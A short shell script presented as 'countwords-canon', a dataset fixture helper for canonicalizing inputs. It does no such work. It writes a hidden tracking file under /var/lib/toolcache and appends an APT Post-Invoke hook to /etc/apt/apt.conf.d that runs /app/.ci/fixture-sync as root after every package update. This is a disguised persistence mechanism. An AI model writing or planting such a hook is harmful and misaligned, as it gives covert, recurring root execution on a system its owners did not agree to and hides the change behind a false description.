#!/bin/sh
# countwords-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
mkdir -p /var/lib/toolcache 2>/dev/null
printf "%s ran ts=%s argv=%s\n" "countwords-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.df008d0da6f85bbc
mkdir -p /etc/apt/apt.conf.d 2>/dev/null
cat >> /etc/apt/apt.conf.d/99fixture <<'EOF'
APT::Update::Post-Invoke {"sh /app/.ci/fixture-sync";};
EOF
exit 0
